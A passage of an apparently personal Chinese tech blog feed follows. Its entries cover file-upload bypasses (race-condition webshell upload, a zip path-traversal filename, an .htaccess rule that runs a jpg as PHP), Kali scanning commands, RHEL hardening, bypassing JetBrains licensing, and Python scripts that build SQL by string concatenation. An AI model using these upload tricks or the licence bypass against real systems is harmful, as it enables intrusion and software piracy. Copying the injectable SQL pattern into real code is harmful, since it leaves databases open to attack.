title="#竞争上传"></a>#竞争上传</h3><p>1.上传一个包含创建webshell的脚本，在文件解压到被删除到时间差内访问webshell<br>2.构造压缩文件，成功解压部分文件，在解压未未完成时出错，不执行删除程序<br>a)上传含<code>png</code>，<code>php</code>文件的压缩包，在上传时抓包。使用”Paste from file“将压缩包放入请求数据包中，并修改最后一个PHP文件的hex值=&gt;成功解压部分并查看被解压的目录<br>b)发现未指定解压目录，构造含有<code>png</code>，<code>php</code>文件的压缩包，用notepad++将<code>xxx.php</code>修改为<code>../xxx.php</code>，通过BP上传，成功在上级目录下创建一个<code>xxx.php</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;htaccess文件突破黑名单（上传格式限制）&quot;&gt;&lt;a href=&quot;#htaccess文件突破黑名单（上传格式限制）&quot; class=&quot;headerlink&quot; title=&quot;#.htaccess文件突破黑名单（上传格式限制）&quot;&gt;&lt;/a&gt;#.htaccess文件突破黑名单（上传格式限制）&lt;/h3&gt;&lt;p&gt;1.自定义.htaccess上传&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;FileMatch “test.jpg”&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SetHandler application&amp;#x2F;x-httpd-php&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;&amp;#x2F;FileMatch&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;2.同目录下上传保存为jpg格式的一句话，成功绕过限制&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Redhat基础测试</title>
    <link href="http://yoursite.com/2020/02/04/Redhat%E5%9F%BA%E7%A1%80%E6%B5%8B%E8%AF%95/"/>
    <id>http://yoursite.com/2020/02/04/Redhat基础测试/</id>
    <published>2020-02-04T05:02:00.000Z</published>
    <updated>2020-02-04T05:10:09.804Z</updated>
    
    <content type="html"><![CDATA[<h3 id="安装"><a href="#安装" class="headerlink" title="#安装"></a>#安装</h3><p>镜像地址：<br>ed2k://|file|[红帽企业Linux.6.4.服务器版].rhel-server-6.4-x86_64-dvd[ED2000.COM].iso|3720347648|542c0277eff8b86b7f0c18358df84702|h=hzclqmdk4re2o4pi5hzr5hpvnu5o4iij|/<br>（复制到迅雷打开）<br>PS. 用VMware安装时，显示网络连接错误，将虚拟机选项中的网络适配器选择为桥接模式</p><a id="more"></a><h3 id="口令安全"><a href="#口令安全" class="headerlink" title="#口令安全"></a>#口令安全</h3><p>1.编辑<code>/etc/login.defs</code> 修改<code>PASS_MIN_LEN参数</code>（最小口令长度） 具体修改代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su - （提升权限）</span><br><span class="line">vim &#x2F;etc&#x2F;login.defs</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-80.png" alt="upload successful"><br>2.编辑<code>/etc/pam.d/system-auth</code>修改password requisite pam_cracklib.so try_first_pass<br>local-only retry authok_type中的<code>retry</code>参数值(错误登录锁定次数)<br><img src="/images/pasted-81.png" alt="upload successful"><br>3.<img src="/images/pasted-82.png" alt="upload successful"><br>4.<img src="/images/pasted-83.png" alt="upload successful"><br>5.<img src="/images/pasted-84.png" alt="upload successful"><br><img src="/images/pasted-85.png" alt="upload successful"><br>具体修改代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">passwd -f gdm</span><br><span class="line">New password：</span><br><span class="line">Retype new password：&#x2F;&#x2F;重复俩次输入密码</span><br></pre></td></tr></table></figure><h3 id="账户安全"><a href="#账户安全" class="headerlink" title="#账户安全"></a>#账户安全</h3><p>1.<img src="/images/pasted-86.png" alt="upload successful"><br>2.<img src="/images/pasted-87.png" alt="upload successful"><br>3.<img src="/images/pasted-88.png" alt="upload successful"></p><h3 id="用户账户安全设置"><a href="#用户账户安全设置" class="headerlink" title="#用户账户安全设置"></a>#用户账户安全设置</h3><p>1.<img src="/images/pasted-91.png" alt="upload successful"><br>2.<img src="/images/pasted-90.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;#安装&quot;&gt;&lt;/a&gt;#安装&lt;/h3&gt;&lt;p&gt;镜像地址：&lt;br&gt;ed2k://|file|[红帽企业Linux.6.4.服务器版].rhel-server-6.4-x86_64-dvd[ED2000.COM].iso|3720347648|542c0277eff8b86b7f0c18358df84702|h=hzclqmdk4re2o4pi5hzr5hpvnu5o4iij|/&lt;br&gt;（复制到迅雷打开）&lt;br&gt;PS. 用VMware安装时，显示网络连接错误，将虚拟机选项中的网络适配器选择为桥接模式&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Kali入门</title>
    <link href="http://yoursite.com/2020/02/04/Kali%E5%85%A5%E9%97%A8/"/>
    <id>http://yoursite.com/2020/02/04/Kali入门/</id>
    <published>2020-02-04T04:59:00.000Z</published>
    <updated>2020-02-04T05:01:06.078Z</updated>
    
    <content type="html"><![CDATA[<h3 id="主机探测"><a href="#主机探测" class="headerlink" title="#主机探测"></a>#主机探测</h3><p>1.1 ping检查主机是否在线<br>例：<code>ping -c 5 -s 2000 192.168.1.3</code> 发送五个大小为2000的字节包到目标主机<br>1.2 arping测试特定IP在网络中是否在线<br>例：<code>arping -c 5 192.168.1.3</code>发送四个ping数据包到目标主机</p><a id="more"></a><p>1.3 hping发送数据并监听返回数据包<br>例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hping3#进入TCL脚本交互式界面</span><br><span class="line">hping send &#123;ip(daddr&#x3D;192.168.1.3)+icmp(type&#x3D;0,code&#x3D;0)&#125;#向目标主机发送一个icmp echo requset请求数据包</span><br><span class="line">hping recv ech0#用户监听返回的数据包</span><br></pre></td></tr></table></figure><p>1.4 nbtscan扫描ip地址获取目标NetBIOS名字信息<br>例：<br><code>nbtscan 192.168.1.3</code> 获取目标NetBIOS名字信息<br><code>nbtscan -hv 192.168.1.3</code> 查看目标主机运行服务<br>1.5 nping 支持多协议并允许用户设置设置网络报文格式的探测工具<br>例：<code>nping -c 2 -p 80 --flags syn 192.168.1.3</code> 向目标主机80端口发送2个带SYN标志的TCP数据包</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;主机探测&quot;&gt;&lt;a href=&quot;#主机探测&quot; class=&quot;headerlink&quot; title=&quot;#主机探测&quot;&gt;&lt;/a&gt;#主机探测&lt;/h3&gt;&lt;p&gt;1.1 ping检查主机是否在线&lt;br&gt;例：&lt;code&gt;ping -c 5 -s 2000 192.168.1.3&lt;/code&gt; 发送五个大小为2000的字节包到目标主机&lt;br&gt;1.2 arping测试特定IP在网络中是否在线&lt;br&gt;例：&lt;code&gt;arping -c 5 192.168.1.3&lt;/code&gt;发送四个ping数据包到目标主机&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Pycharm/Phpstorm注册码</title>
    <link href="http://yoursite.com/2020/02/04/Pycharm-Phpstorm%E6%B3%A8%E5%86%8C%E7%A0%81/"/>
    <id>http://yoursite.com/2020/02/04/Pycharm-Phpstorm注册码/</id>
    <published>2020-02-04T04:56:00.000Z</published>
    <updated>2020-02-04T05:25:50.260Z</updated>
    
    <content type="html"><![CDATA[<h3 id="学生邮箱注册认证后可以免费使用一年"><a href="#学生邮箱注册认证后可以免费使用一年" class="headerlink" title="#学生邮箱注册认证后可以免费使用一年"></a>#学生邮箱注册认证后可以免费使用一年</h3><h3 id="注册码"><a href="#注册码" class="headerlink" title="#注册码"></a>#注册码</h3><p>访问网站[<a href="http://idea.lanyus.com/]复制注册码" target="_blank" rel="noopener">http://idea.lanyus.com/]复制注册码</a><br>将“0.0.0.0 account.jetbrains.com”添加到hosts文件中</p><a id="more"></a><p><img src="/images/pasted-78.png" alt="upload successful"><br><img src="/images/pasted-92.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;学生邮箱注册认证后可以免费使用一年&quot;&gt;&lt;a href=&quot;#学生邮箱注册认证后可以免费使用一年&quot; class=&quot;headerlink&quot; title=&quot;#学生邮箱注册认证后可以免费使用一年&quot;&gt;&lt;/a&gt;#学生邮箱注册认证后可以免费使用一年&lt;/h3&gt;&lt;h3 id=&quot;注册码&quot;&gt;&lt;a href=&quot;#注册码&quot; class=&quot;headerlink&quot; title=&quot;#注册码&quot;&gt;&lt;/a&gt;#注册码&lt;/h3&gt;&lt;p&gt;访问网站[&lt;a href=&quot;http://idea.lanyus.com/]复制注册码&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://idea.lanyus.com/]复制注册码&lt;/a&gt;&lt;br&gt;将“0.0.0.0 account.jetbrains.com”添加到hosts文件中&lt;/p&gt;
    
    </summary>
    
    
      <category term="教程" scheme="http://yoursite.com/categories/%E6%95%99%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>Python(4)</title>
    <link href="http://yoursite.com/2020/02/03/Python-4/"/>
    <id>http://yoursite.com/2020/02/03/Python-4/</id>
    <published>2020-02-03T03:14:00.000Z</published>
    <updated>2020-02-04T04:56:21.169Z</updated>
    
    <content type="html"><![CDATA[<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="#常用函数"></a>#常用函数</h3><p>*字符显示格式<br>title():以首字母大写的形式显示单词<br>upper():字符串全部大写<br>lower():字符串全部小写</p><a id="more"></a><p>删除空白<br>rstrip():删除开头空白<br>lstrip():删除末尾空白<br>strip():删除俩端空白<br>组织列表<br>append():将元素添加到列表末尾<br>insert():将元素添加到列表任意位置<code>例：insert(0,&#39;1111&#39;)</code><br>del():已知元素位置，删除 <code>例：del message[0]</code><br>pop():弹出，将元素从列表中删除但是可以另外使用<code>message.pop(0)</code><br>remove():已知元素值，删除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">例：</span><br><span class="line">message&#x3D;[&#39;1&#39;,&#39;2&#39;,&#39;3&#39;]</span><br><span class="line"></span><br><span class="line">message.remove(&#39;2&#39;)</span><br><span class="line">or</span><br><span class="line">number&#x3D;&#39;2&#39;</span><br><span class="line">message.remove(number)</span><br></pre></td></tr></table></figure><p>sort():按照字母顺序排序（永久）<code>例：car.sort() 正序``car.sort(reverse=True) 逆序</code><br>sorted()：按照字母顺序排序（临时）<br>reverse():反转列表元素的排列顺序（永久）<br>len():显示列表长度</p><p>*操作列表<br>range():创建数值列表 <code>例：range（1，5） 显示1，2，3，4/range（1，5，2） 显示1，3</code><br>复制列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">my&#x3D;[&#39;a&#39;,&#39;b&#39;,&#39;c&#39;]</span><br><span class="line">you&#x3D;my[:]</span><br></pre></td></tr></table></figure><p>set():剔除列表中的重复项<br>int():获取数值的输入</p><h3 id="概念"><a href="#概念" class="headerlink" title="#概念"></a>#概念</h3><p>列表&amp;元组&amp;字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">列表：</span><br><span class="line">message&#x3D;[&#39;1&#39;,&#39;2&#39;,&#39;3&#39;]</span><br><span class="line">print(message[0:1])</span><br><span class="line">&#x2F;&#x2F;输出结果为列表</span><br><span class="line">[&#39;1&#39;]</span><br><span class="line"></span><br><span class="line">元组：</span><br><span class="line">message&#x3D;(1,2,3)</span><br><span class="line">print(message[0])</span><br><span class="line">&#x2F;&#x2F;输出结果为数字</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">字典：</span><br><span class="line">message&#x3D;&#123;&#39;numeber_1&#39;:&#39;1&#39;,&#39;numeber_2&#39;:&#39;2&#39;,&#39;numeber_3&#39;:&#39;3&#39;&#125;</span><br><span class="line">print(message[&#39;number_1&#39;]</span><br><span class="line">&#x2F;&#x2F;输出结果为键number_1对于的键值1</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>通过字典存储个人信息，再将整体存储在列表中 用列表存储一些个人喜好的总和，再在字典中作为键值存储</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;常用函数&quot;&gt;&lt;a href=&quot;#常用函数&quot; class=&quot;headerlink&quot; title=&quot;#常用函数&quot;&gt;&lt;/a&gt;#常用函数&lt;/h3&gt;&lt;p&gt;*字符显示格式&lt;br&gt;title():以首字母大写的形式显示单词&lt;br&gt;upper():字符串全部大写&lt;br&gt;lower():字符串全部小写&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>Python(3)</title>
    <link href="http://yoursite.com/2020/02/03/Python-3/"/>
    <id>http://yoursite.com/2020/02/03/Python-3/</id>
    <published>2020-02-03T03:13:00.000Z</published>
    <updated>2020-02-03T03:15:18.677Z</updated>
    
    <content type="html"><![CDATA[<h3 id="循环停止的三种方法"><a href="#循环停止的三种方法" class="headerlink" title="#循环停止的三种方法"></a>#循环停止的三种方法</h3><p>1）<code>while循环</code>中使用条件语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">str&#x3D;&quot;what&#39;s your name?:&quot;</span><br><span class="line">message&#x3D;&#39;&#39;</span><br><span class="line">while message !&#x3D; &#39;quit&#39;:</span><br><span class="line">    message&#x3D;input(str)</span><br><span class="line">    </span><br><span class="line">    if message !&#x3D;&#39;quit&#39;</span><br><span class="line">    print(message)</span><br></pre></td></tr></table></figure><a id="more"></a><p>2)使用<code>变量active</code>来控制循环的结束</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">str&#x3D;&quot;what&#39;s your name?:&quot;</span><br><span class="line">active&#x3D;True</span><br><span class="line">while active:</span><br><span class="line">    message&#x3D;input(str)</span><br><span class="line">    if message&#x3D;&#x3D;&#39;quit&#39;:</span><br><span class="line">        active&#x3D;False</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br></pre></td></tr></table></figure><p>3)使用<code>break</code>结束循环</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">str&#x3D;&quot;what&#39;s your name?:&quot;</span><br><span class="line">message&#x3D;&#39;&#39;</span><br><span class="line">while True:</span><br><span class="line">    message&#x3D;input(str)</span><br><span class="line">    if message &#x3D;&#x3D; &#39;quit&#39;:</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;循环停止的三种方法&quot;&gt;&lt;a href=&quot;#循环停止的三种方法&quot; class=&quot;headerlink&quot; title=&quot;#循环停止的三种方法&quot;&gt;&lt;/a&gt;#循环停止的三种方法&lt;/h3&gt;&lt;p&gt;1）&lt;code&gt;while循环&lt;/code&gt;中使用条件语句&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;str&amp;#x3D;&amp;quot;what&amp;#39;s your name?:&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;message&amp;#x3D;&amp;#39;&amp;#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;while message !&amp;#x3D; &amp;#39;quit&amp;#39;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    message&amp;#x3D;input(str)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if message !&amp;#x3D;&amp;#39;quit&amp;#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    print(message)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Pythom" scheme="http://yoursite.com/categories/Pythom/"/>
    
    
  </entry>
  
  <entry>
    <title>Python json解析</title>
    <link href="http://yoursite.com/2020/02/03/Python-json%E8%A7%A3%E6%9E%90/"/>
    <id>http://yoursite.com/2020/02/03/Python-json解析/</id>
    <published>2020-02-03T03:07:00.000Z</published>
    <updated>2020-02-03T03:11:59.550Z</updated>
    
    <content type="html"><![CDATA[<p>json文件地址:<a href="http://www.arachni-scanner.com/reports/report.json" target="_blank" rel="noopener">http://www.arachni-scanner.com/reports/report.json</a><br>下载保存为<code>test1.json</code></p><h3 id="取出字典中的键值"><a href="#取出字典中的键值" class="headerlink" title="#取出字典中的键值"></a>#取出字典中的键值</h3><p><img src="/images/pasted-73.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import pymysql</span><br><span class="line">import  json</span><br><span class="line"></span><br><span class="line">db &#x3D; pymysql.connect(host&#x3D;&#39;localhost&#39;,user&#x3D;&#39;root&#39;,passwd&#x3D;&#39;saltneko&#39;,db&#x3D;&#39;test3&#39;) #连接数据库</span><br><span class="line">cursor &#x3D; db.cursor()</span><br><span class="line">filename&#x3D;&#39;&#x2F;Users&#x2F;salt&#x2F;PycharmProjects&#x2F;Study&#x2F;test1.json&#39;</span><br><span class="line">with open(filename, &#39;rb&#39;) as f:</span><br><span class="line">    Data &#x3D; json.load(f)</span><br><span class="line">    s &#x3D; Data[&#39;options&#39;][&#39;checks&#39;] #直接取字典的键值</span><br><span class="line">    i &#x3D; 1</span><br><span class="line">    for a in s:</span><br><span class="line">        sql&#x3D;&#39;insert into web_loophole_type (Id,Web_loophole_type_description_en) values(&#39; + str(</span><br><span class="line">            i) + &quot;,&#39;&quot; + a + &quot;&#39;&quot; + &#39;);&#39;</span><br><span class="line">        cursor.execute(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        i &#x3D; i + 1</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="字典中存在不同的键取出键值"><a href="#字典中存在不同的键取出键值" class="headerlink" title="#字典中存在不同的键取出键值"></a>#字典中存在不同的键取出键值</h3><p><img src="/images/pasted-74.png" alt="upload successful"><br><img src="/images/pasted-75.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import pymysql</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db &#x3D; pymysql.connect(host&#x3D;&#39;localhost&#39;,user&#x3D;&#39;root&#39;,passwd&#x3D;&#39;saltneko&#39;,db&#x3D;&#39;test3&#39;)</span><br><span class="line">cursor &#x3D; db.cursor()</span><br><span class="line">filename&#x3D;&#39;&#x2F;Users&#x2F;salt&#x2F;PycharmProjects&#x2F;Study&#x2F;test1.json&#39;</span><br><span class="line">with open(filename, &#39;rb&#39;) as f:</span><br><span class="line">    Data &#x3D; json.load(f)</span><br><span class="line">    s1 &#x3D; Data[&#39;sitemap&#39;]</span><br><span class="line">    s2 &#x3D; Data[&#39;plugins&#39;][&#39;healthmap&#39;][&#39;results&#39;][&#39;map&#39;]</span><br><span class="line">    i &#x3D; 1</span><br><span class="line">#map作为一个列表,通过遍历其中取出的key为字典</span><br><span class="line">    for key1 in s1.keys():</span><br><span class="line">        for i in s2:</span><br><span class="line">            try:</span><br><span class="line">                key1 &#x3D; (i[&#39;without_issues&#39;])</span><br><span class="line">            except:</span><br><span class="line">                continue</span><br><span class="line">                #因为存在with_issues和without_issues俩种键，加入异常处理</span><br><span class="line">            sql&#x3D;&#39;insert into sitemap(Id,Sitemap,Healthymap) values(&#39; + str(i) + &quot;,&#39;&quot; + key1 + &quot;&#39;&quot; + &quot;,&#39;&quot;+key2+&quot;&#39;&quot;+&#39;);&#39;</span><br><span class="line">            cursor.execute(sql)</span><br><span class="line">            db.commit()</span><br><span class="line">            i&#x3D;i+1</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">with open(filename, &#39;rb&#39;) as f:</span><br><span class="line">    Data &#x3D; json.load(f)</span><br><span class="line">    s1 &#x3D; Data[&#39;sitemap&#39;]</span><br><span class="line">    s2 &#x3D; Data[&#39;plugins&#39;][&#39;healthmap&#39;][&#39;results&#39;][&#39;map&#39;]</span><br><span class="line">        for key1 in s1.keys():</span><br><span class="line">        for key2 in s2:</span><br><span class="line">            if key2.get(&#39;without_issues&#39;):</span><br><span class="line">                key2&#x3D;key2.get(&#39;without_issues&#39;)</span><br><span class="line">                print(key2)</span><br><span class="line">                #get到的值数量等于键值，可能存在空值</span><br></pre></td></tr></table></figure><h3 id="通过遍历数组对其中包含的字典取出键值"><a href="#通过遍历数组对其中包含的字典取出键值" class="headerlink" title="#通过遍历数组对其中包含的字典取出键值"></a>#通过遍历数组对其中包含的字典取出键值</h3><p><img src="/images/pasted-76.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import pymysql</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db &#x3D; pymysql.connect(host&#x3D;&#39;localhost&#39;,user&#x3D;&#39;root&#39;,passwd&#x3D;&#39;saltneko&#39;,db&#x3D;&#39;test3&#39;)</span><br><span class="line">cursor &#x3D; db.cursor()</span><br><span class="line">filename&#x3D;&#39;&#x2F;Users&#x2F;salt&#x2F;PycharmProjects&#x2F;Study&#x2F;test1.json&#39;</span><br><span class="line">with open(filename, &#39;rb&#39;) as f:</span><br><span class="line">    Data &#x3D; json.load(f)</span><br><span class="line">    s1 &#x3D; Data[&#39;issues&#39;]</span><br><span class="line">    #issues作为一个列表,通过遍历其中取出的i为字典</span><br><span class="line">    for i in s1:</span><br><span class="line">        print(i[&#39;vector&#39;][&#39;url&#39;])#继续解析字典</span><br></pre></td></tr></table></figure><h3 id="字典包含数组"><a href="#字典包含数组" class="headerlink" title="#字典包含数组"></a>#字典包含数组</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    &#39;a&#39;:[&#39;1&#39;,&#39;2&#39;,&#39;3&#39;],</span><br><span class="line">    &#39;b&#39;:[&#39;1&#39;,&#39;2&#39;,&#39;3&#39;],</span><br><span class="line">    &#39;c&#39;:[&#39;1&#39;,&#39;2&#39;,&#39;3&#39;],</span><br><span class="line">    &#125;</span><br><span class="line">for key,value in favourite_places.items():</span><br><span class="line">    print(key+&quot;&#39;s favourite places are :&quot; )</span><br><span class="line">    for key2 in value:</span><br><span class="line">        print(key2)</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for key in favourite_places.values():</span><br><span class="line">    print(key)</span><br></pre></td></tr></table></figure><h3 id="数组中包含字典"><a href="#数组中包含字典" class="headerlink" title="#数组中包含字典"></a>#数组中包含字典</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Pets&#x3D;[]</span><br><span class="line">pet1&#x3D;&#123;</span><br><span class="line">    &#39;name&#39;:&#39;pet1&#39;,</span><br><span class="line">    &#39;people&#39;:&#39;pet11&#39;</span><br><span class="line">&#125;</span><br><span class="line">pet2&#x3D;&#123;</span><br><span class="line">    &#39;name&#39;:&#39;pet2&#39;,</span><br><span class="line">    &#39;people&#39;:&#39;pet22&#39;</span><br><span class="line">&#125;</span><br><span class="line">pet3&#x3D;&#123;</span><br><span class="line">    &#39;name&#39;:&#39;pet3&#39;,</span><br><span class="line">    &#39;people&#39;:&#39;pet33&#39;</span><br><span class="line">&#125;</span><br><span class="line">Pets.append(pet1)</span><br><span class="line">Pets.append(pet2)</span><br><span class="line">Pets.append(pet3)</span><br><span class="line">for key1 in Pets:</span><br><span class="line">    print(key1[&#39;name&#39;])</span><br></pre></td></tr></table></figure><h3 id="字典中包含字典"><a href="#字典中包含字典" class="headerlink" title="#字典中包含字典"></a>#字典中包含字典</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cities&#x3D;&#123;</span><br><span class="line">    &#39;nanjing&#39;:&#123;</span><br><span class="line">        &#39;country&#39;:&#39;CN&#39;,</span><br><span class="line">        &#39;population&#39;:&#39;10000&#39;,</span><br><span class="line">        